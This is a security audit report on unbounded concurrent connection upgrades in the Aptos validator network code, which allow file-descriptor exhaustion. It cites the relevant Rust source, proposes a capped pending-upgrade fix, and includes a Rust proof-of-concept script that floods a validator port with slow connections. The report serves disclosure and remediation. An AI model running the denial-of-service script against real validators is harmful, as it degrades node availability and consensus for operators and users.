# Audit Report

## Title
File Descriptor Exhaustion via Unbounded Concurrent Connection Upgrades

## Summary
The Aptos validator network layer accepts and processes inbound TCP connections without enforcing a limit on the number of concurrent connection upgrades in progress. An attacker can rapidly establish many TCP connections that slowly complete the Noise handshake, causing file descriptors to accumulate during the upgrade phase. This bypasses the `inbound_connection_limit` check which only applies after upgrades complete, allowing FD exhaustion and validator DoS.

## Finding Description
The vulnerability exists in the connection upgrade pipeline where:

1. **TCP connections are accepted immediately with FD allocation**: [1](#0-0) 

2. **Each accepted connection enters an unbounded upgrade queue**: [2](#0-1) 

The `pending_inbound_connections` FuturesUnordered has no size limit, allowing unlimited concurrent upgrade attempts.

3. **Each upgrade holds the socket/FD for up to 30 seconds**: [3](#0-2) 

During this period, the connection undergoes Noise handshake and protocol negotiation: [4](#0-3) 

4. **Connection limits are only enforced AFTER upgrade completes**: [5](#0-4) 

**Attack Path:**
- Attacker rapidly opens TCP connections to validator (limited only by TCP backlog of 256 and kernel limits)
- Each connection is accepted (FD allocated) and enters upgrade pipeline
- Attacker deliberately slows Noise handshake by sending data slowly or sending malformed data that takes time to reject
- FDs accumulate in `pending_inbound_connections` for up to 30 seconds each
- The `inbound_connection_limit` of 100 unknown peers doesn't prevent this because it only applies to completed connections
- Eventually exhausts system FD limit (typically 1024-65536 per process)

The `pending_connection_upgrades` metric tracks this but provides no enforcement: [6](#0-5) 

## Impact Explanation
This is **HIGH severity** per the Aptos bug bounty criteria:
- **Validator node slowdowns**: When FD limit is approached, the validator cannot accept new legitimate connections
- **Significant protocol violations**: Validator may miss consensus messages, affecting AptosBFT liveness
- **Partial DoS**: If FD limit is exhausted, validator becomes unreachable to new peers

At 1024 FDs, an attacker opening 40 connections/second sustains 1200 concurrent FDs, exhausting the validator. At higher system limits (65536 FDs), sustained attack of ~2000 connections/second is required, but still feasible for motivated attackers.

## Likelihood Explanation
**HIGH likelihood**:
- Attack requires only basic TCP client capabilities
- No authentication needed before FD exhaustion occurs
- Noise handshake provides attacker control over timing (can send data slowly)
- No rate limiting on connection acceptance before upgrade
- The TCP backlog of 256 provides initial buffering but doesn't prevent sustained attacks

## Recommendation
Implement a hard limit on concurrent pending connection upgrades:

```rust
// In network/framework/src/peer_manager/transport.rs
const MAX_PENDING_INBOUND_UPGRADES: usize = 200; // 2x inbound_connection_limit

pub async fn listen(mut self) {
    let mut pending_inbound_connections = FuturesUnordered::new();
    let mut pending_outbound_connections = FuturesUnordered::new();

    loop {
        futures::select! {
            inbound_connection = self.listener.select_next_some() => {
                // Check pending upgrades limit BEFORE adding
                if pending_inbound_connections.len() >= MAX_PENDING_INBOUND_UPGRADES {
                    warn!(
                        NetworkSchema::new(&self.network_context),
                        "Rejecting connection: too many pending upgrades ({})",
                        pending_inbound_connections.len()
                    );
                    counters::connections_rejected(
                        &self.network_context,
                        ConnectionOrigin::Inbound
                    ).inc();
                    continue; // Drop the connection immediately
                }
                
                if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                    pending_inbound_connections.push(fut);
                }
            },
            // ... rest unchanged
        }
    }
}
```

Additionally, consider:
- Adding per-IP rate limiting before upgrade
- Reducing TRANSPORT_TIMEOUT for unknown peers
- Implementing adaptive backpressure based on pending upgrade count

## Proof of Concept
```rust
// Rust PoC demonstrating FD exhaustion attack
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

#[tokio::main]
async fn main() {
    let target = "validator_ip:6180"; // Validator network port
    let connections_opened = Arc::new(AtomicUsize::new(0));
    
    // Spawn many concurrent connection attempts
    let mut handles = vec![];
    for _ in 0..2000 {
        let target = target.to_string();
        let counter = connections_opened.clone();
        
        let handle = tokio::spawn(async move {
            match TcpStream::connect(&target).await {
                Ok(mut stream) => {
                    counter.fetch_add(1, Ordering::Relaxed);
                    // Connect but don't complete handshake - just hold FD
                    // Send partial Noise handshake data slowly
                    let _ = stream.writable().await;
                    // Hold connection for 30 seconds (until timeout)
                    sleep(Duration::from_secs(30)).await;
                },
                Err(e) => eprintln!("Connection failed: {}", e),
            }
        });
        
        handles.push(handle);
        
        // Open connections at 50/sec rate
        sleep(Duration::from_millis(20)).await;
    }
    
    // After 30 seconds, ~1500 connections should be pending
    // Monitor validator: `lsof -p <validator_pid> | wc -l`
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Total connections opened: {}", 
             connections_opened.load(Ordering::Relaxed));
}
```

**Expected result**: Validator's FD count grows unbounded during the attack, potentially reaching system limits and causing connection rejection for legitimate peers.

## Notes
This vulnerability affects the production code path where `AptosNetTransport` is used, not just the `and_then.rs` combinator itself. While the `and_then` pattern doesn't have built-in limits, the actual issue manifests in the `TransportHandler::listen()` event loop where concurrent upgrades accumulate without bounds. The timeout provides eventual FD release but doesn't prevent accumulation faster than timeout rate.

### Citations

**File:** network/netcore/src/transport/tcp.rs (L319-329)
```rust
    fn poll_next(self: Pin<&mut Self>, context: &mut Context) -> Poll<Option<Self::Item>> {
        match self.inner.poll_accept(context) {
            Poll::Ready(Ok((socket, addr))) => {
                if let Err(e) = self.config.apply_config(&socket) {
                    return Poll::Ready(Some(Err(e)));
                }
                let dialer_addr = NetworkAddress::from(addr);
                Poll::Ready(Some(Ok((
                    future::ready(Ok(TcpSocket::new(socket))),
                    dialer_addr,
                ))))
```

**File:** network/framework/src/peer_manager/transport.rs (L91-109)
```rust
        let mut pending_inbound_connections = FuturesUnordered::new();
        let mut pending_outbound_connections = FuturesUnordered::new();

        debug!(
            NetworkSchema::new(&self.network_context),
            "{} Incoming connections listener Task started", self.network_context
        );

        loop {
            futures::select! {
                dial_request = self.transport_reqs_rx.select_next_some() => {
                    if let Some(fut) = self.dial_peer(dial_request) {
                        pending_outbound_connections.push(fut);
                    }
                },
                inbound_connection = self.listener.select_next_some() => {
                    if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                        pending_inbound_connections.push(fut);
                    }
```

**File:** network/framework/src/peer_manager/transport.rs (L148-152)
```rust
                counters::pending_connection_upgrades(
                    &self.network_context,
                    ConnectionOrigin::Inbound,
                )
                .inc();
```

**File:** network/framework/src/transport/mod.rs (L40-41)
```rust
/// A timeout for the connection to open and complete all of the upgrade steps.
pub const TRANSPORT_TIMEOUT: Duration = Duration::from_secs(30);
```

**File:** network/framework/src/transport/mod.rs (L249-331)
```rust
async fn upgrade_inbound<T: TSocket>(
    ctxt: Arc<UpgradeContext>,
    fut_socket: impl Future<Output = io::Result<T>>,
    addr: NetworkAddress,
    proxy_protocol_enabled: bool,
) -> io::Result<Connection<NoiseStream<T>>> {
    let origin = ConnectionOrigin::Inbound;
    let mut socket = fut_socket.await?;

    // If we have proxy protocol enabled, process the event, otherwise skip it
    // TODO: This would make more sense to build this in at instantiation so we don't need to put the if statement here
    let addr = if proxy_protocol_enabled {
        proxy_protocol::read_header(&addr, &mut socket)
            .await
            .map_err(|err| {
                debug!(
                    network_address = addr,
                    error = %err,
                    "ProxyProtocol: Failed to read header: {}",
                    err
                );
                err
            })?
    } else {
        addr
    };

    // try authenticating via noise handshake
    let (mut socket, remote_peer_id, peer_role) =
        ctxt.noise.upgrade_inbound(socket).await.map_err(|err| {
            if err.should_security_log() {
                sample!(
                    SampleRate::Duration(Duration::from_secs(15)),
                    warn!(
                        SecurityEvent::NoiseHandshake,
                        NetworkSchema::new(&ctxt.noise.network_context)
                            .network_address(&addr)
                            .connection_origin(&origin),
                        error = %err,
                    )
                );
            }
            let err = io::Error::other(err);
            add_pp_addr(proxy_protocol_enabled, err, &addr)
        })?;
    let remote_pubkey = socket.get_remote_static();
    let addr = addr.append_prod_protos(remote_pubkey, HANDSHAKE_VERSION);

    // exchange HandshakeMsg
    let handshake_msg = HandshakeMsg {
        supported_protocols: ctxt.supported_protocols.clone(),
        chain_id: ctxt.chain_id,
        network_id: ctxt.network_id,
    };
    let remote_handshake = exchange_handshake(&handshake_msg, &mut socket)
        .await
        .map_err(|err| add_pp_addr(proxy_protocol_enabled, err, &addr))?;

    // try to negotiate common aptosnet version and supported application protocols
    let (messaging_protocol, application_protocols) = handshake_msg
        .perform_handshake(&remote_handshake)
        .map_err(|err| {
            let err = format!(
                "handshake negotiation with peer {} failed: {}",
                remote_peer_id.short_str(),
                err
            );
            add_pp_addr(proxy_protocol_enabled, io::Error::other(err), &addr)
        })?;

    // return successful connection
    Ok(Connection {
        socket,
        metadata: ConnectionMetadata::new(
            remote_peer_id,
            CONNECTION_ID_GENERATOR.next(),
            addr,
            origin,
            messaging_protocol,
            application_protocols,
            peer_role,
        ),
    })
```

**File:** network/framework/src/peer_manager/mod.rs (L352-388)
```rust
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
```
